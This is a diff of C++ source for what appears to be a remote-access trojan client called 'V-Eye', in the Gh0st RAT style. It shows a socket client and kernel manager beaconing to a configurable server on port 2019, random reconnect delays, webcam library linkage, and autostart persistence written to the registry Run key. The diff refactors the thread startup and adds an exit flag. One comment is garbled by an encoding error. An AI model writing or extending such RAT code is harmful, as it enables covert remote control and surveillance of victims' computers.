@@ -16,12 +16,15 @@
 #pragma comment(lib, "vfw32.lib")
 
 BOOL    bisUnInstall = FALSE;
+// È«¾Ö×´Ì¬Á¿
+BOOL g_bExit = FALSE;
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
 #endif
 
 #define DEFAULT_SERVER _T("127.0.0.1")
+#define SERVER_PORT 2019
 #define SETTINGS_FILE _T("C:\\V-Eye\\V-Eye.ini")
 
 int main()
@@ -38,10 +41,10 @@ int main()
         return 0;
     }
 
-    CClientSocket SocketClient;
+    CClientSocket SocketClient(g_bExit);
     int     nSleep = 0;
     bool	bBreakError = false;
-    while (1) {
+    while (!g_bExit) {
         if (bBreakError != false) {
             nSleep = rand();
             Sleep(nSleep % 120000);
@@ -54,7 +57,7 @@ int main()
         char	lpszHost[256]= {0};
         UINT  	dwPort = 0;
 
-        dwPort = 2019;
+        dwPort = SERVER_PORT;
         strcat(lpszHost,strAddr);
 
         if(strcmp(lpszHost,"") == 0) {
@@ -69,7 +72,7 @@ int main()
         }
 
         DWORD upTickCount = GetTickCount()-dwTickCount;
-        CKernelManager	manager(&SocketClient,lpszHost,dwPort);
+        CKernelManager	manager(&SocketClient, lpszHost, dwPort, g_bExit);
 
         SocketClient.SetManagerCallBack(&manager);
 
@@ -98,12 +101,9 @@ int main()
 }
 
 
-DWORD __stdcall MainThread()
+DWORD __stdcall MainThread(LPVOID)
 {
-    HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, NULL, 0, NULL);
-    WaitForSingleObject(hThread, INFINITE);
-    CloseHandle(hThread);
-    return 1;
+    return main();
 }
 
 
@@ -174,7 +174,9 @@ BOOL CServerApp::InitInstance()
         WriteRegEx(HKEY_CURRENT_USER, strSubKey1, szRun, REG_SZ, strKey, lstrlen(strKey), 1);
     }
 
-    MainThread();
+	HANDLE hThread = MyCreateThread(NULL, 0, MainThread, NULL, 0, NULL);
+	WaitForSingleObject(hThread, INFINITE);
+	CloseHandle(hThread);
 
     return FALSE;
 }
